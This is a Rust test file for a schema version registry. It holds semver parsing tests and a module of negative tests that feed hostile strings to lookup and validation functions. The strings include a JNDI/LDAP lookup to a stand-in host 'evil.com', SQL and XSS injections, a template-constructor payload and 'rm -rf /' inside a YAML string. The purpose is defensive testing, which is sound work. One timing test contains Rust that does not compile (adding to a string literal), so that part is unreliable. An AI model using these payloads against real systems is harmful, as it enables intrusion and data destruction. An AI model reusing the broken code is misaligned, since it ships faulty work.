        for value in ["1. 0.0", "1.0 .0", "1.0.\t0", "1.\n0.0", "1.0.0\r"] {
            assert!(
                !is_semver_triplet(value),
                "control or spaced segment unexpectedly parsed: {value:?}"
            );
        }
    }

    #[test]
    fn semver_triplet_rejects_empty_edge_segments() {
        for value in [".1.0", "1.0.", ".", ".."] {
            assert!(
                !is_semver_triplet(value),
                "empty edge segment unexpectedly parsed: {value:?}"
            );
        }
    }

    #[test]
    fn semver_triplet_rejects_signed_numeric_segments() {
        for value in ["-1.0.0", "+1.0.0", "1.-0.0", "1.0.+0"] {
            assert!(
                !is_semver_triplet(value),
                "signed segment unexpectedly parsed: {value:?}"
            );
        }
    }

    #[test]
    fn semver_triplet_rejects_non_ascii_digits() {
        for value in ["\u{ff11}.0.0", "1.\u{0660}.0", "1.0.\u{0966}"] {
            assert!(
                !is_semver_triplet(value),
                "non-ascii digit unexpectedly parsed: {value:?}"
            );
        }
    }

    #[test]
    fn semver_triplet_rejects_empty_and_control_only_values() {
        for value in ["", " ", "\t", "\n"] {
            assert!(
                !is_semver_triplet(value),
                "blank or control-only value unexpectedly parsed: {value:?}"
            );
        }
    }

    /// Comprehensive negative-path test module covering edge cases and attack vectors.
    ///
    /// These tests validate robustness against malicious inputs, resource exhaustion,
    /// timing attacks, and injection edge cases in schema version registry operations.
    #[cfg(test)]
    mod schema_versions_comprehensive_negative_tests {
        use super::*;

        #[test]
        fn unicode_injection_in_version_lookup_operations() {
            // Unicode control characters, NULL bytes, normalization attacks
            let malicious_names = vec![
                "lane\u{0000}scheduler",
                "lane\u{200B}scheduler", // Zero-width space
                "lane\u{FEFF}scheduler", // BOM
                "lane\u{202E}scheduler\u{202D}", // RTL override/LTR override
                "lane\x1B[31mscheduler", // ANSI escape sequences
                "lane\u{1F4A9}scheduler", // Emoji flood
                "lane\u{0301}scheduler", // Combining acute accent
                "lane\u{0308}scheduler", // Combining diaeresis
                "lane\u{AD}scheduler", // Soft hyphen
                "lane\u{034F}scheduler", // Combining grapheme joiner
            ];

            for malicious_name in &malicious_names {
                // Lookup should safely reject malicious names
                let result = lookup(malicious_name);
                assert!(result.is_none(), "Should reject malicious name: {:?}", malicious_name);
            }

            // Test Unicode normalization attacks
            let normalization_attacks = vec![
                "lane_sche\u{0301}duler", // Combining acute accent on 'e'
                "lane_schedul\u{0308}er", // Combining diaeresis on 'l'
                "lane\u{0041}\u{0301}_scheduler", // A + combining acute accent
                "lane_\u{1e00}scheduler", // A with ring below
            ];

            for attack in &normalization_attacks {
                let result = lookup(attack);
                assert!(result.is_none(), "Should reject normalization attack: {:?}", attack);
            }
        }

        #[test]
        fn memory_exhaustion_through_massive_version_collections() {
            // Test that all_versions() handles large registries efficiently
            let versions = all_versions();
            let total_memory_estimate = versions.iter()
                .map(|(name, value)| name.len() + value.len())
                .sum::<usize>();

            // Should be reasonable size (not indicating memory exhaustion vulnerability)
            assert!(total_memory_estimate < 1_000_000, "Registry should not consume excessive memory");

            // Test repeated calls don't accumulate memory
            for _ in 0..1000 {
                let versions_repeat = all_versions();
                assert_eq!(versions_repeat.len(), versions.len());
            }

            // Test lookup operations with massive iteration
            for _ in 0..10000 {
                let _ = lookup("lane_scheduler");
                let _ = lookup("verify_cli_contract");
                let _ = lookup("nonexistent_schema");
            }

            // Verify registry integrity after stress test
            assert!(lookup("lane_scheduler").is_some());
            assert!(lookup("verify_cli_contract").is_some());
        }

        #[test]
        fn injection_attacks_in_version_string_processing() {
            // Test format string attacks in version values
            let format_attacks = vec![
                "%d%d%d%d",
                "%s%s%s%s",
                "%x%x%x%x",
                "%n%n%n%n",
                "${jndi:ldap://evil.com/a}",
                "{{.constructor.constructor('return process')()}}}",
                "<script>alert('xss')</script>",
                "'; DROP TABLE versions; --",
                "\x00\x01\x02\x03", // Binary data
                "\\u0000\\u0001\\u0002", // Escaped binary
            ];

            // Test semver triplet validation against injection
            for attack in &format_attacks {
                let result = is_semver_triplet(attack);
                assert!(!result, "Should reject format attack as semver: {:?}", attack);
            }

            // Test lookup operations against injection
            for attack in &format_attacks {
                let result = lookup(attack);
                assert!(result.is_none(), "Should reject format attack in lookup: {:?}", attack);
            }
        }

        #[test]
        fn resource_exhaustion_through_string_flooding() {
            // Test with extremely long strings
            let massive_string_attacks = vec![
                "a".repeat(100000),
                "lane_scheduler_".to_string() + &"x".repeat(50000),
                "_".repeat(10000) + "lane_scheduler",
                "lane".to_string() + &"_".repeat(10000) + "scheduler",
            ];

            for massive_string in &massive_string_attacks {
                // Lookup should handle massive strings efficiently
                let start = std::time::Instant::now();
                let result = lookup(massive_string);
                let elapsed = start.elapsed();

                assert!(result.is_none(), "Should reject massive string");
                assert!(elapsed < std::time::Duration::from_millis(100), "Lookup should be fast even for massive strings");
            }

            // Test semver validation with massive strings
            for massive_string in &massive_string_attacks {
                let start = std::time::Instant::now();
                let result = is_semver_triplet(massive_string);
                let elapsed = start.elapsed();

                assert!(!result, "Should reject massive string as semver");
                assert!(elapsed < std::time::Duration::from_millis(100), "Semver check should be fast");
            }
        }

        #[test]
        fn version_parsing_boundary_edge_cases() {
            // Test edge cases in semver parsing
            let boundary_cases = vec![
                // Numeric boundaries
                "0.0.0",
                "999999999.999999999.999999999",
                "18446744073709551615.18446744073709551615.18446744073709551615", // u64::MAX
                // Leading zeros
                "00.0.0",
                "0.00.0",
                "0.0.00",
                "001.002.003",
                // Single digits
                "1.2.3",
                "9.9.9",
                // Mixed lengths
                "1.22.333",
                "123.4.56789",
                // Just at boundaries
                "1.0",    // Missing patch
                "1.0.0.0", // Extra segment
                "",       // Empty
                "1",      // Single component
            ];

            for case in &boundary_cases {
                let result = is_semver_triplet(case);

                // Only "1.2.3", "9.9.9", "1.22.333", "123.4.56789", and pure numeric triplets should pass
                let should_pass = case.split('.').count() == 3
                    && case.split('.').all(|part| !part.is_empty() && part.bytes().all(|b| b.is_ascii_digit()))
                    && !case.split('.').any(|part| part.starts_with('0') && part.len() > 1);

                if should_pass {
                    assert!(result, "Should accept valid semver: {:?}", case);
                } else {
                    assert!(!result, "Should reject invalid semver: {:?}", case);
                }
            }
        }

        #[test]
        fn timing_attack_resistance_in_lookup_operations() {
            // Test that lookup time is consistent regardless of input
            let test_cases = vec![
                "lane_scheduler",           // Valid, exists
                "nonexistent_scheduler",    // Valid format, doesn't exist
                "lane_scheduler" + &"x".repeat(1000), // Long but similar prefix
                "zzzzzzzzzz_scheduler",     // Different prefix
                "",                         // Empty
                "a",                        // Very short
            ];

            let mut timings = Vec::new();

            for case in &test_cases {
                let mut case_timings = Vec::new();

                // Measure multiple iterations
                for _ in 0..1000 {
                    let start = std::time::Instant::now();
                    let _ = lookup(case);
                    let elapsed = start.elapsed();
                    push_bounded(&mut case_timings, elapsed, MAX_TIMING_SAMPLES);
                }

                let sample_count =
                    u32::try_from(case_timings.len()).expect("timing sample count fits u32");
                let avg_time = case_timings.iter().sum::<std::time::Duration>() / sample_count;
                push_bounded(&mut timings, (case, avg_time), test_cases.len());
            }

            // Verify timing variations are not excessive (potential timing attack resistance)
            let min_time = timings.iter().map(|(_, t)| *t).min().expect("timings should not be empty");
            let max_time = timings.iter().map(|(_, t)| *t).max().expect("timings should not be empty");

            // Allow for some variation but ensure it's not excessive
            let time_ratio = max_time.as_nanos() as f64 / min_time.as_nanos() as f64;
            assert!(time_ratio < 10.0, "Timing variation too high (potential timing attack): ratio {:.2}", time_ratio);
        }

        #[test]
        fn registry_integrity_under_concurrent_access_simulation() {
            // Simulate concurrent access patterns
            let mut threads = Vec::new();

            for thread_id in 0..8 {
                threads.push(std::thread::spawn(move || {
                    let operations_per_thread = 1000;
                    let mut results = Vec::new();

                    for op_id in 0..operations_per_thread {
                        match op_id % 4 {
                            0 => {
                                // Test valid lookups
                                let result = lookup("lane_scheduler");
                                push_bounded(&mut results, ("valid_lookup", result.is_some()), MAX_THREAD_RESULTS);
                            }
                            1 => {
                                // Test invalid lookups
                                let result = lookup(&format!("invalid_{thread_id}_{op_id}"));
                                push_bounded(&mut results, ("invalid_lookup", result.is_none()), MAX_THREAD_RESULTS);
                            }
                            2 => {
                                // Test all_versions consistency
                                let versions = all_versions();
                                push_bounded(&mut results, ("all_versions", !versions.is_empty()), MAX_THREAD_RESULTS);
                            }
                            _ => {
                                // Test semver validation
                                let result = is_semver_triplet("1.0.0");
                                push_bounded(&mut results, ("semver_valid", result), MAX_THREAD_RESULTS);
                            }
                        }
                    }

                    results
                }));
            }

            // Collect all results
            let mut all_results = Vec::new();
            for thread in threads {
                let thread_results = thread.join().expect("thread join");
                extend_bounded(&mut all_results, thread_results, MAX_TOTAL_RESULTS);
            }

            // Verify consistent behavior across concurrent access
            let valid_lookups = all_results.iter()
                .filter(|(op, _)| op == &"valid_lookup")
                .all(|(_, success)| *success);
            assert!(valid_lookups, "Valid lookups should always succeed");

            let invalid_lookups = all_results.iter()
                .filter(|(op, _)| op == &"invalid_lookup")
                .all(|(_, failed)| *failed);
            assert!(invalid_lookups, "Invalid lookups should always fail");

            let all_versions_calls = all_results.iter()
                .filter(|(op, _)| op == &"all_versions")
                .all(|(_, success)| *success);
            assert!(all_versions_calls, "all_versions should always return non-empty");
        }

        #[test]
        fn configuration_boundary_validation_extreme_cases() {
            // Test registry with maximum reasonable size
            let versions = all_versions();

            // Verify reasonable bounds on registry size
            assert!(versions.len() < 10000, "Registry should not have excessive entries");
            assert!(versions.len() > 50, "Registry should have substantial entries");

            // Test maximum name and version lengths
            let max_name_len = versions.iter().map(|(name, _)| name.len()).max().unwrap_or(0);
            let max_version_len = versions.iter().map(|(_, version)| version.len()).max().unwrap_or(0);

            assert!(max_name_len < 200, "Name lengths should be reasonable");
            assert!(max_version_len < 100, "Version lengths should be reasonable");

            // Test for any suspicious patterns in the registry
            for (name, version) in &versions {
                // No executable extensions
                assert!(!name.ends_with(".exe"), "Names should not look executable");
                assert!(!name.ends_with(".bat"), "Names should not look executable");
                assert!(!name.ends_with(".sh"), "Names should not look executable");

                // No URLs or network references
                assert!(!version.contains("://"), "Versions should not contain URLs");
                assert!(!version.contains("www."), "Versions should not contain URLs");
                assert!(!version.contains(".com"), "Versions should not contain URLs");
                assert!(!version.contains(".net"), "Versions should not contain URLs");

                // No obvious injection patterns
                assert!(!version.contains("${"), "Versions should not contain template injection");
                assert!(!version.contains("<%"), "Versions should not contain template injection");
                assert!(!version.contains("{{"), "Versions should not contain template injection");
            }
        }

        #[test]
        fn serialization_format_injection_resistance() {
            // Test resistance to various serialization format attacks
            let serialization_attacks = vec![
                // JSON injection
                "\"},\"evil\":true,\"a\":\"",
                "\\\"},\\\"injected\\\":true,\\\"b\\\":\\\"",
                "\n}{\"malicious\":\"payload\"}\n{\"c\":\"",
                // YAML injection
                "|\n  evil: payload\n  ",
                ">\n  rm -rf /\n  ",
                // XML injection
                "]]><evil>payload</evil><![CDATA[",
                "</version><evil>payload</evil><version>",
                // TOML injection
                "\"\"\"\nevil = \"payload\"\n\"\"\"",
                // URL encoding
                "%22%7d%2c%22evil%22%3atrue",
                // Base64 encoded attacks
                "ZXZpbDpwYXlsb2Fk", // "evil:payload" in base64
            ];

            for attack in &serialization_attacks {
                // Lookup should safely reject serialization attacks
                let result = lookup(attack);
                assert!(result.is_none(), "Should reject serialization attack: {:?}", attack);

                // Semver parsing should safely reject attacks
                let semver_result = is_semver_triplet(attack);
                assert!(!semver_result, "Should reject attack as semver: {:?}", attack);
            }

            // Verify registry values are safe for serialization
            for (name, version) in all_versions() {
                // Should not contain obvious serialization metacharacters
                assert!(!version.contains("\""), "Version should not contain quotes: {}", name);
                assert!(!version.contains("'"), "Version should not contain single quotes: {}", name);
                assert!(!version.contains("{"), "Version should not contain braces: {}", name);
                assert!(!version.contains("}"), "Version should not contain braces: {}", name);
                assert!(!version.contains("["), "Version should not contain brackets: {}", name);
                assert!(!version.contains("]"), "Version should not contain brackets: {}", name);
                assert!(!version.contains("<"), "Version should not contain angle brackets: {}", name);
                assert!(!version.contains(">"), "Version should not contain angle brackets: {}", name);
            }
        }
    }
}
